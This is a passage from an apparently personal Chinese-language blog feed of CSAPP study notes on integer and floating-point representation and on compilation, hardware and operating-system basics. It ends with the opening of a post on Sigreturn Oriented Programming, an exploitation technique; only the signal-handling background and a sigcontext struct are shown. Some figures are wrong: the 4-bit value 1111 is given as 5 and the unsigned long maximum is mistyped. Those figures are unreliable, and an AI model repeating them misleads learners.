char</td><td>0</td><td>255</td></tr><tr><td>short</td><td>-32768</td><td>32767</td></tr><tr><td>unsigned short</td><td>0</td><td>65535</td></tr><tr><td>int</td><td>-2147483648</td><td>2147483647</td></tr><tr><td>unsigned</td><td>0</td><td>4294967295</td></tr><tr><td>long</td><td>-9223372036854775808 (-2147483648)</td><td>9223372036854775807 (2147483647)</td></tr><tr><td>unsigned long</td><td>0</td><td>18446744037709551615 (4294967295)</td></tr></tbody></table><p>如上表我们可以发现，有符号的数据类型在正数和负数的范围并不严格对称，负数范围总是比正数大1。</p><p>需要注意的是，通常C语言中<strong>大多数的数字都默认为有符号</strong>，要创建无符号常量必须加上后缀字符 <code>&#39;u&#39;</code> 或 <code>&#39;U&#39;</code>。例如声明 <code>12345</code> 这样的常量就被认为是有符号的， <code>0x12b4u</code> 才会被认为是无符号常量。</p><h4 id="无符号数的编码"><a href="#无符号数的编码" class="headerlink" title="无符号数的编码"></a>无符号数的编码</h4><p>无符号数实际上就是非负数，就是只包括正数和 0 的部分。无符号数没有符号位，因此他们的编码范围始终从 0 开始。</p><p>无符号整数的编码方法通常基于二进制表示，每位（或位组合）可以表示 2 个可能的值：0和1。编码中没有符号位，<strong>最高位通常是最高有效位</strong>，表示最大的权值。</p><p><img src="/img/CSAPP-%E7%AC%AC%E4%BA%8C%E7%AB%A0-%E4%BF%A1%E6%81%AF%E5%AD%98%E5%82%A8-%E6%80%BB%E7%BB%93/2-%E6%97%A0%E7%AC%A6%E5%8F%B7%E7%BC%96%E7%A0%81.png"></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">4</span>位二进制编码：<span class="hljs-number">0000</span> (<span class="hljs-number">0</span>), <span class="hljs-number">1001</span> (<span class="hljs-number">9</span>), <span class="hljs-number">1111</span> (<span class="hljs-number">5</span>)<br><span class="hljs-attribute">8</span>位二进制编码：<span class="hljs-number">00000000</span> (<span class="hljs-number">0</span>), <span class="hljs-number">01011010</span> (<span class="hljs-number">90</span>), <span class="hljs-number">11111111</span> (<span class="hljs-number">255</span>)<br></code></pre></td></tr></table></figure><blockquote><p>就是最简单的正常二进制表示方法 </p></blockquote><h4 id="补码编码"><a href="#补码编码" class="headerlink" title="补码编码"></a>补码编码</h4><p>实际运用中不仅只有正数数据，我们还想要实现负数值，补码就是最常见的负数表示方法。</p><p>在补码的定义中，<strong>字的最高位为符号位</strong>。符号位为0表示正数，符号位为1表示负数。</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">8</span>位二进制补码： <span class="hljs-number">00000000</span> (<span class="hljs-number">0</span>), <span class="hljs-number">00000101</span> (<span class="hljs-number">5</span>), <span class="hljs-number">11111011</span> (-<span class="hljs-number">5</span>)<br></code></pre></td></tr></table></figure><p>在单纯的二进制数字层面，由于最高位是最高权值，所以在位数相同的情况下，最高位是 1 的二进制数永远大于最高位是 0 的二进制数。因此正负数补码对应的二进制范围是没有交集的，所以无论其他位如何变化都不会使某个数据的正负混淆。</p><h3 id="有符号数与无符号数的转换"><a href="#有符号数与无符号数的转换" class="headerlink" title="有符号数与无符号数的转换"></a>有符号数与无符号数的转换</h3><p>有符号数和无符号数之间的转换分为两种：显示转换和隐式转换。</p><p><strong>显示转换</strong>也称强制类型转换，需要使用特定的语法和类型转换操作符。例如：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> signedValue;<br><span class="hljs-type">unsigned</span> unsignedValue ;<br><br>signedValue = (<span class="hljs-type">int</span>) unsignedValue ; <br>unsignedValue = (<span class="hljs-type">unsigned</span>) signedValue;<br></code></pre></td></tr></table></figure><blockquote><p>需要注意的是，显示转换可能导致数据截断或数据丢失。</p></blockquote><p><strong>隐式转换</strong>也称为自动类型转换或自动升级，由编译器自动执行，以使表达式或操作能够成功进行。</p><p>例如，将一种类型的表达式赋值给另外一种类型的变量，编译器会自动执行隐式转换：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> signedValue;<br><span class="hljs-type">unsigned</span> unsignedValue ;<br><br>signedValue = unsignedValue ; <br>unsignedValue = signedValue;<br></code></pre></td></tr></table></figure><p>不同类型的变量进行运算时发生的也是隐式转换。</p><p>隐式转换原则：</p><ul><li><p>在混合使用浮点数和整数类型时，通常将整数提升为浮点数，出现过double则结果一定为double</p></li><li><p>若都是整数参与运算则结果也是整数</p></li><li><p>整数运算的结果为出现过的位数最大的整数，若最大的整数中有无符号类型的则结果无符号。</p></li></ul><h3 id="扩展一个数字的位表示"><a href="#扩展一个数字的位表示" class="headerlink" title="扩展一个数字的位表示"></a>扩展一个数字的位表示</h3><p>要将无符号数转化成一个更大的数据类型，我们只需要在开头添加 <code>0</code> 即可。这种运算称为 <strong>0 扩展</strong>。</p><p>但是如果是将补码数字转换为更大的数据类型，将会执行<strong>符号扩展</strong>，非负数开头添加 <code>0</code> ，负数则需要开头添 <code>1</code>。</p><p>我们运行下面的代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-type">void</span> <span class="hljs-title function_">show_bytes</span><span class="hljs-params">(<span class="hljs-type">void</span> *start,<span class="hljs-type">size_t</span> len)</span>&#123;    <br>    <span class="hljs-type">size_t</span> i;<br>    <span class="hljs-keyword">for</span>(i=<span class="hljs-number">0</span>;i&lt;len;i++)<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%.2x &quot;</span>,*(<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> *)(start+i));<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br>&#125;<br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-type">short</span> x=<span class="hljs-number">0x1234</span>;<br>    <span class="hljs-type">short</span> y=<span class="hljs-number">-0x1234</span>;<br>    show_bytes(&amp;x,<span class="hljs-keyword">sizeof</span>(x));<br>    show_bytes(&amp;y,<span class="hljs-keyword">sizeof</span>(y));<br>    <span class="hljs-type">int</span> x1=x;<br>    <span class="hljs-type">int</span> y1=y;<br>    show_bytes(&amp;x1,<span class="hljs-keyword">sizeof</span>(x1));<br>    show_bytes(&amp;y1,<span class="hljs-keyword">sizeof</span>(y1));<br>&#125;<br></code></pre></td></tr></table></figure><p>输出结果为：</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs txt">34 12 <br>cc ed<br>34 12 00 00<br>cc ed ff ff<br></code></pre></td></tr></table></figure><h3 id="截断数字"><a href="#截断数字" class="headerlink" title="截断数字"></a>截断数字</h3><p>我们需要减少一个数字的位数时就需要截断数字，当我们将 w 位的数字截断为 k 位数字时，我们就会丢弃有效位的高 <code>w-k</code> 位，补码数字的符号位是始终不变的。</p><p>需要注意有符号数的阶段可能会发生溢出现象。例如，一个8位带符号整数，其范围是从 -128 到 127。如果原始带符号整数为 -150，将其截断为 8 位带符号整数会导致溢出，因为 -150 不在 -128 到 127 的范围内。截断后的结果可能是正数 106，这是 -150 的溢出结果，这不是原始值的正确表示。</p><h2 id="整数运算"><a href="#整数运算" class="headerlink" title="整数运算"></a>整数运算</h2><h4 id="加法"><a href="#加法" class="headerlink" title="加法"></a>加法</h4><p>无符号加法遵循二进制的加法规则，从最低位（最右边的位）开始逐位相加，进位会传递到高位。</p><p>补码加法仍然遵循标准的二进制加法规则，但符号位也会参与计算。当执行补码加法时，符号位与其他位一起相加，如果有溢出，则溢出会影响符号位。</p><h4 id="乘法"><a href="#乘法" class="headerlink" title="乘法"></a>乘法</h4><p>无符号乘法遵循标准的乘法规则，乘法有 <code>x*y=(x*y) mod 2^w</code> 其中 <code>w</code> 为 <code>x </code>和 <code>y</code> 的位数。需要注意，因为 <code>x</code> 和 <code>y</code> 相乘可能得到最大 <code>2w</code> 位的整数，因此可能会发生截断。</p><p>补码乘法同样遵循标准的乘法规则，但符号位也会参与计算。可以理解为先像无符号乘法，乘出来截断之后再转为补码就是结果。</p><h4 id="除以2的幂"><a href="#除以2的幂" class="headerlink" title="除以2的幂"></a>除以2的幂</h4><p>除以 2 的幂通过右移运算来实现，无符号和补码数分别使用逻辑移位和算术移位来实现。</p><h2 id="浮点数"><a href="#浮点数" class="headerlink" title="浮点数"></a>浮点数</h2><h3 id="二进制小数"><a href="#二进制小数" class="headerlink" title="二进制小数"></a>二进制小数</h3><p>二进制小数的表示方法和十进制原理相同，只不过十进制的底数为 10，二进制的权值底数变成了 2。</p><h3 id="IEEE-浮点表示"><a href="#IEEE-浮点表示" class="headerlink" title="IEEE 浮点表示"></a>IEEE 浮点表示</h3><p>IEEE浮点标准用如下的公式来表示一个数：</p><p><img src="/img/CSAPP-%E7%AC%AC%E4%BA%8C%E7%AB%A0-%E4%BF%A1%E6%81%AF%E5%AD%98%E5%82%A8-%E6%80%BB%E7%BB%93/2-IEEE%E6%B5%AE%E7%82%B9%E6%95%B0%E8%A1%A8%E7%A4%BA%E6%96%B9%E6%B3%95.png"></p><ul><li>符号(s)：<code>1</code> 表示负数，<code>0</code> 表示正数</li><li>尾数(M)：是一个二进制的小数，取值范围为 <code>[1,2)</code></li><li>阶码(E)：为浮点数加权。</li></ul><blockquote><p>这个方法就相当于是二进制的科学计数法。</p></blockquote><p>浮点数可以分为三个字段：符号位，阶码字段和小数字段。</p><p>我们经常用的浮点数有两类，单精度浮点数 <code>float</code> 和双精度浮点数 <code>double</code>，<code>float</code> 为 <code>32</code> 位，<code>double</code> 为 <code>64</code> 位。</p><ul><li>对于 <code>float</code>，最高位表示符号位；第 <code>2</code> 到第 <code>9</code> 位表示阶码，用来指示指数位；第 <code>10</code> 位到第 <code>32</code> 位均为尾数</li><li>对于 <code>double</code>，最高位表示符号位；第 <code>2</code> 到第 <code>12</code> 位表示阶码，用来指示指数位；第 <code>13</code> 位到第 <code>64</code> 位均为尾数</li></ul><p>根据阶码部分的值，被编码的值有 <code>3 </code>中表示的情况：</p><ul><li><p>规格化的值：阶码位不为全 <code>0</code> 也不为全 <code>1</code>。此时阶码字段被解释为以偏置形式表示的有符号整数。对应的阶码的值是 <code>E=e-(2^k-1)</code></p></li><li><p>非规格化的值：当阶码位全为 <code>0</code> 的时候，表示非规格化的值。此时阶码字段被解释为以偏置形式表示的有符号整数。对应的阶码的值是 <code>E=1-(2^k-1)</code></p><p>非格式化数可以用来表示非常接近于 0.0 的数，它提供了一种逐渐溢出的属性使可能的数值均匀的接近于 0.0。</p></li><li><p>特殊值：包括 <code>INF</code> 和 <code>NAN</code>，阶码位全为 <code>1</code> 的时候，若尾数全为0，则得到 <code>INF</code>，若不全为 <code>0</code> 则得到 <code>NAN</code>。</p></li></ul><h4 id="舍入"><a href="#舍入" class="headerlink" title="舍入"></a>舍入</h4><p>因为浮点数的表示方法限制了浮点数的范围和精度，多以我们需要利用特定的系统的方法使存储的数据无限接近于实际的数字，这就是舍入的工作。</p><p>总共有四种舍入的方法，下表为原理示例：</p><table><thead><tr><th align="center">方式</th><th align="center">1.40</th><th align="center">1.60</th><th align="center">1.50</th><th align="center">2.50</th><th align="center">-1.50</th></tr></thead><tbody><tr><td align="center">向偶数舍入</td><td align="center">1</td><td align="center">2</td><td align="center">2</td><td align="center">2</td><td align="center">-2</td></tr><tr><td align="center">向零舍入</td><td align="center">1</td><td align="center">1</td><td align="center">1</td><td align="center">2</td><td align="center">-1</td></tr><tr><td align="center">向下舍入</td><td align="center">1</td><td align="center">1</td><td align="center">1</td><td align="center">2</td><td align="center">-2</td></tr><tr><td align="center">向上舍入</td><td align="center">2</td><td align="center">2</td><td align="center">2</td><td align="center">3</td><td align="center">-1</td></tr></tbody></table><blockquote><p>其中，向偶数舍入也就是向最近的值舍入，其他的方法原理均和字面含义相同</p></blockquote><h4 id="浮点运算"><a href="#浮点运算" class="headerlink" title="浮点运算"></a>浮点运算</h4><p>浮点数的加法和减法遵循一般的二进制加法和减法规则，但需要额外考虑指数部分的对齐。</p><p>浮点数的乘法和除法也遵循一般的二进制乘法和除法规则，但需要额外的处理来正确处理指数和尾数。具体来说，乘法时将指数相加，尾数相乘，然后对结果进行规范化。除法时将指数相减，尾数相除，然后对结果进行规范化。</p><hr><p>开学喽🥲</p>]]></content>
    
    
    <categories>
      
      <category>读书笔记</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Knowledge</tag>
      
      <tag>CSAPP</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CSAPP 第一章 计算机系统漫游 总结</title>
    <link href="/2023/08/31/CSAPP-%E7%AC%AC%E4%B8%80%E7%AB%A0-%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E6%BC%AB%E6%B8%B8-%E6%80%BB%E7%BB%93/"/>
    <url>/2023/08/31/CSAPP-%E7%AC%AC%E4%B8%80%E7%AB%A0-%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E6%BC%AB%E6%B8%B8-%E6%80%BB%E7%BB%93/</url>
    
    <content type="html"><![CDATA[<p>第一章是总论，把一下简单的概念梳理了一下</p><span id="more"></span><h1 id="程序的编译"><a href="#程序的编译" class="headerlink" title="程序的编译"></a>程序的编译</h1><p>带有 <code>.c</code> 后缀的C语言源文件是不能直接在程序上运行的，需要将其中的C语句转换为机器语言，按照<strong>可执行目标程序</strong>的格式打好包，并以二进制磁盘文件的形式存放起来。目标程序也称为<strong>可执行目标文件。</strong></p><p>我们常使用的编译命令 <code>gcc -o hello hello.c</code> ，具体的编译过程分为四个阶段：(1) 预处理；(2) 编译；(3) 汇编；(4) 链接；</p><p><img src="/img/CSAPP-%E7%AC%AC%E4%B8%80%E7%AB%A0-%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E6%BC%AB%E6%B8%B8-%E6%80%BB%E7%BB%93/1-%E7%BC%96%E8%AF%91%E8%BF%87%E7%A8%8B.png"></p><h3 id="01-预处理"><a href="#01-预处理" class="headerlink" title="01 预处理"></a>01 预处理</h3><p>预处理器将根据将读取所有的 <code>#include</code> 头文件以及宏定义，把他们插入文本中，将原本的命令替换成其具体详细的内容。</p><p>处理结果是得到 <code>.i</code> 文本文件</p><h3 id="02-编译"><a href="#02-编译" class="headerlink" title="02 编译"></a>02 编译</h3><p>编译器将 <code>.i</code> 文件转换为 <code>.s</code> 文件，其代码指令由C语言代码转为汇编指令。文件中包含函数 main 的定义，类似下图：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs assembly">main:<br>pushq %rbp<br>movq %rsp ,%rbp<br>leaq .LC0 ,%rdi<br>call puts@PLT<br>movl $0 ,%eax<br>popq %rbp<br>ret<br></code></pre></td></tr></table></figure><h3 id="03-汇编"><a href="#03-汇编" class="headerlink" title="03 汇编"></a>03 汇编</h3><p>汇编器将 <code>.s</code> 文件的人类可读的文本指令转换为计算机可读的二进制机器语言指令，把这些指令打包成一种叫做<strong>可重定位目标程序</strong>（relocatable object program）的格式，并将结果保存在 <code>.o</code> 文件中。</p><p>此时的文件用文本编辑器打开的话内容将是乱码。</p><h3 id="04-链接"><a href="#04-链接" class="headerlink" title="04 链接"></a>04 链接</h3><p>链接器 .o 目标文件与其他目标文件、库文件、启动文件等链接起来<strong>生成可执行目标文件</strong>。</p><p>例如我们在程序中调用 printf 函数，printf 函数存在于一个名为 printf.o 的单独的预编译好了的目标文件中，而这个文件必须由链接器合并到我们的 hello.o 程序中。</p><h1 id="系统的硬件组成"><a href="#系统的硬件组成" class="headerlink" title="系统的硬件组成"></a>系统的硬件组成</h1><p>系统硬件由四部分组成：总线、I&#x2F;O设备、主存和处理器</p><p><img src="/img/CSAPP-%E7%AC%AC%E4%B8%80%E7%AB%A0-%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E6%BC%AB%E6%B8%B8-%E6%80%BB%E7%BB%93/1-%E7%A1%AC%E4%BB%B6%E7%BB%84%E6%88%90.png"></p><h3 id="总线"><a href="#总线" class="headerlink" title="总线"></a>总线</h3><p>总线就是贯穿整个系统的电子管道，负责在各个部件之间传递信息。</p><p>通常总线被设计成传送定长的字节块，也就是计算机处理数据的基本单元大小<strong>字（word）</strong>。不同系统中的机器字长不同，大部分是 4 字节（32位）和 8 字节（64位）。</p><h3 id="I-x2F-O-设备"><a href="#I-x2F-O-设备" class="headerlink" title="I&#x2F;O 设备"></a>I&#x2F;O 设备</h3><p>I&#x2F;O（输入&#x2F;输出）设备就是系统与外界联系的通道。像键盘鼠标，以及磁盘驱动器、网络驱动器之类的硬件都是 I&#x2F;O 设备。</p><p>每个 I&#x2F;O 设备都通过一个<strong>控制器</strong>或<strong>适配器</strong>与 I&#x2F;O 总线相连，负责在二者之间传递信息。</p><blockquote><p>控制器是 I&#x2F;O 设备本身或者系统的主印制电路板（主板）上的芯片组</p><p>适配器是一块插在主板插槽上的卡</p></blockquote><h3 id="主存"><a href="#主存" class="headerlink" title="主存"></a>主存</h3><p>从物理上来说，主存是由一组<strong>动态随机存取存储器</strong>（DRAM）芯片组成的。从逻辑上来说，存储器是一个线性的字节数组，每个字节都有其唯一的地址（数组索引），这些地址是从零开始的。</p><blockquote><p>主存也就是我们会在购买电脑时在详情页中看到的“运行内存”，代表程序可以同时运行的程序和数据大小</p></blockquote><h3 id="处理器"><a href="#处理器" class="headerlink" title="处理器"></a>处理器</h3><p><strong>中央处理单元</strong>（CPU），简称<strong>处理器</strong>，是解释（或执行）存储在主存中指令的引擎。处理器的核心是一个大小为一个字的存储设备（或<strong>寄存器</strong>），称为<strong>程序计数器</strong>（PC）。</p><p>在任何时刻，PC 都指向主存中的某条机器语言指令（即含有该条指令的地址）。</p><blockquote><p>此 PC 非 “个人计算机” PC 哦</p></blockquote><p>从系统通电开始，直到系统断电，处理器一直在不断地执行程序计数器指向的指令，再更新程序计数器，使其指向下一条指令，不断循环往复。这个过程围绕着主存、<strong>寄存器文件</strong>（register file）和<strong>算术&#x2F;逻辑单元</strong>（ALU）进行。</p><h3 id="运行一个程序"><a href="#运行一个程序" class="headerlink" title="运行一个程序"></a>运行一个程序</h3><p>假设我们目标运行的程序将输出 “hello world！”，我们在命令行解释器shell中直接输入文件名，系统就会执行文件并作出相应的输出。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">linux&gt; </span><span class="language-bash">./hello</span><br>hello world！<br></code></pre></td></tr></table></figure><p>在计算机层面，运行程序就是不断复制的一个过程，大致分为以下几个流程：</p><p>首先我们在键盘上输入字符串 <code>”./hello“</code> ，shell 会将其字符逐一读入寄存器，再把他们放入内存中。</p><p>![](&#x2F;img&#x2F;CSAPP-第一章-计算机系统漫游-总结&#x2F;1-read hello from keyboard.png)</p><p>敲击回车键以后，shell 就会执行一系列指令来加载可执行的 hello 文件，这些指令将会把目标文件中的代码和数据复制到主存。</p><p><img src="/img/CSAPP-%E7%AC%AC%E4%B8%80%E7%AB%A0-%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E6%BC%AB%E6%B8%B8-%E6%80%BB%E7%BB%93/1-%E4%BB%8E%E7%A3%81%E7%9B%98%E5%8A%A0%E8%BD%BD%E5%8F%AF%E6%89%A7%E8%A1%8C%E6%96%87%E4%BB%B6%E5%88%B0%E4%B8%BB%E5%AD%98.png"></p><p>接下来，CPU就会开始处理 目标程序的 main 程序中的机器语言指令。这些指令将会把将要输出的字符串中的字节从主存复制到寄存器文件，再从寄存器复制到显示设备，最终显示到屏幕上。</p><p><img src="/img/CSAPP-%E7%AC%AC%E4%B8%80%E7%AB%A0-%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E6%BC%AB%E6%B8%B8-%E6%80%BB%E7%BB%93/1-%E5%B0%86%E8%BE%93%E5%87%BA%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%BB%8E%E5%AD%98%E5%82%A8%E5%99%A8%E5%86%99%E5%88%B0%E6%98%BE%E7%A4%BA%E5%99%A8.png"></p><h1 id="操作系统"><a href="#操作系统" class="headerlink" title="操作系统"></a>操作系统</h1><p>我们可以把操作系统理解为应用程序和硬件之间的一层软件，所有应用对硬件的操作尝试都必须经过操作系统。</p><p>![](&#x2F;img&#x2F;CSAPP-第一章-计算机系统漫游-总结&#x2F;1-操作系统 .png)</p><p>操作系统的功能：</p><ul><li><p>防止硬件被失控的应用程序滥用</p></li><li><p>向应用程序提供简单一致的机制来控制低级硬件设备</p></li></ul><p>操作系统通过三个抽象概念来实现上述功能：进程、虚拟内存、文件</p><p>三个概念的关系如下图所示：</p><p><img src="/img/CSAPP-%E7%AC%AC%E4%B8%80%E7%AB%A0-%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E6%BC%AB%E6%B8%B8-%E6%80%BB%E7%BB%93/1-%E7%B3%BB%E7%BB%9F%E7%AE%A1%E7%90%86%E7%A1%AC%E4%BB%B6%E7%9A%84%E6%8A%BD%E8%B1%A1%E5%85%B3%E7%B3%BB.png"></p><h3 id="进程"><a href="#进程" class="headerlink" title="进程"></a>进程</h3><p><strong>进程</strong>是操作系统对正在运行的程序的一种抽象。</p><p><strong>线程</strong>是操作系统能够进行运算调度的最小单位。它被包含在进程之中，是进程中的实际运作单位。一个进程由多个线程组成，每个线程都运行在进程的上下文中，共享同样的代码和数据。</p><p><strong>并发运行</strong>是指一个进程的指令和另一个进程的指令交错执行，多个进程同时活动。一个CPU通过上下文切换实现并发执行多个程序。</p><h3 id="虚拟内存"><a href="#虚拟内存" class="headerlink" title="虚拟内存"></a>虚拟内存</h3><p><strong>虚拟内存</strong>是主存和I&#x2F;O设备的抽象，它为进程提供一种独立占用内存的假象。</p><p>每个进程看到的内存都是一致的，称为<strong>虚拟地址空间</strong>。每个进程看到的虚拟地址空间由大量准确定义的区构成，每个区都有专门的功能。</p><p><img src="/img/CSAPP-%E7%AC%AC%E4%B8%80%E7%AB%A0-%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E6%BC%AB%E6%B8%B8-%E6%80%BB%E7%BB%93/1-%E8%BF%9B%E7%A8%8B%E7%9A%84%E8%99%9A%E6%8B%9F%E5%9C%B0%E5%9D%80%E7%A9%BA%E9%97%B4.png"></p><h4 id="文件"><a href="#文件" class="headerlink" title="文件"></a>文件</h4><p>文件就是<strong>字节序列</strong>，每个I&#x2F;O设备，包括磁盘、键盘、显示设备，甚至网络都可看为文件。</p><h1 id="重要概念"><a href="#重要概念" class="headerlink" title="重要概念"></a>重要概念</h1><h3 id="Amdahl-定律"><a href="#Amdahl-定律" class="headerlink" title="Amdahl 定律"></a>Amdahl 定律</h3><p>Amdahl 定律（也叫阿姆达尔定律）主要思想是，当我们对系统的某个部分加速时，其对系统整体性能的影响取决于该部分的重要性和加速程度。</p><p>所以，<strong>要想显著加速整个系统，必须提升全系统中相当大的部分的速度</strong>。</p><h3 id="并行和并发"><a href="#并行和并发" class="headerlink" title="并行和并发"></a>并行和并发</h3><p><strong>并发</strong>是指一个同时具有多个活动的系统。</p><p><strong>并行</strong>是指用并发来使一个系统运行得更快。</p><h4 id="线程级并发"><a href="#线程级并发" class="headerlink" title="线程级并发"></a>线程级并发</h4><p>构建在进程这个抽象之上，我们能够设计出同时有多个程序执行的系统，这就导致了并发。使用线程，我们甚至能够在一个进程中执行多个控制流。</p><p><strong>多处理器系统</strong>是由单操作系统内核控制的多处理器组成的系统。</p><p><strong>多核处理器</strong>是将多个CPU(称为”核”)集成到一个集成电路芯片上。</p><p>超线程，有时称为<strong>同时多线程</strong>（simultaneous multi-threading），是一项允许一个 CPU 执行多个控制流的技术。超线程的处理器可以在单个周期的基础上决定要执行哪一个线程，比如，假设一个线程必须等到某些数据被装载到高速缓存中，那在这个装在过程中， CPU 就可以继续去执行另外的一个线程。</p><h4 id="指令级并行"><a href="#指令级并行" class="headerlink" title="指令级并行"></a>指令级并行</h4><p>现代处理器可以同时执行多条指令的属性称为指令级并行。</p><p><strong>超标量处理器</strong>是指可以达到比一个周期一条指令更快的执行速率的处理器。</p><h4 id="单指令、多数据并行"><a href="#单指令、多数据并行" class="headerlink" title="单指令、多数据并行"></a>单指令、多数据并行</h4><p>单指令、多数据，即 SIMD 并行，就是许多现代处理器拥有特殊的硬件，允许一条指令产生多个可以并行执行的操作。</p><h3 id="虚拟机"><a href="#虚拟机" class="headerlink" title="虚拟机"></a>虚拟机</h3><p>虚拟机提供对整个计算机的抽象，包括操作系统、处理器和程序。</p><p>虚拟机这个抽象概念与之前的进程、虚拟内存和文件的抽象概念关系如下图：</p><p><img src="/img/CSAPP-%E7%AC%AC%E4%B8%80%E7%AB%A0-%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E6%BC%AB%E6%B8%B8-%E6%80%BB%E7%BB%93/1-%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E6%8F%90%E4%BE%9B%E7%9A%84%E4%B8%80%E4%BA%9B%E6%8A%BD%E8%B1%A1.png"></p><hr><p>之前一直在<del>快乐暑假摆烂</del> 到处吃席，终于要开始恢复学习状态辣🤪</p>]]></content>
    
    
    <categories>
      
      <category>读书笔记</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Knowledge</tag>
      
      <tag>CSAPP</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SROP</title>
    <link href="/2023/08/15/SROP/"/>
    <url>/2023/08/15/SROP/</url>
    
    <content type="html"><![CDATA[<p> Sigreturn Oriented Programming (SROP)，面向 Sigreturn 的编程 </p><span id="more"></span><h1 id="signal-机制"><a href="#signal-机制" class="headerlink" title="signal 机制"></a>signal 机制</h1><h3 id="Signal-handing"><a href="#Signal-handing" class="headerlink" title="Signal handing"></a>Signal handing</h3><p>信号处理（Signal handing）是 UNIX 系统中进程相互通信的一种机制。 在信号处理过程中，首先会保存当前进程的上下文，然后执行信号处理程序，最后恢复上下文并继续正常执行。</p><p>SROP 本质是 sigreturn 这个系统调用，主要是将所有寄存器压入栈中，以及压入 signal 信息，以及指向 sigreturn 的系统调用地址。</p><h3 id="context"><a href="#context" class="headerlink" title="context"></a>context</h3><p>对于信号帧（signal Frame）来说，会因为架构的不同而有所区别。以下分别给出 32 位和 64 位的 sigcontext ：</p><ul><li>32位</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sigcontext</span></span><br><span class="hljs-class">&#123;</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">short</span> gs, __gsh;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">short</span> fs, __fsh;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">short</span> es, __esh;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">short</span> ds, __dsh;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> edi;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> esi;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> ebp;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> esp;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> ebx;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> edx;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> ecx;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> eax;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> trapno;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> err;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> eip;<br>  <span class="hljs-type">unsigned</span> <span 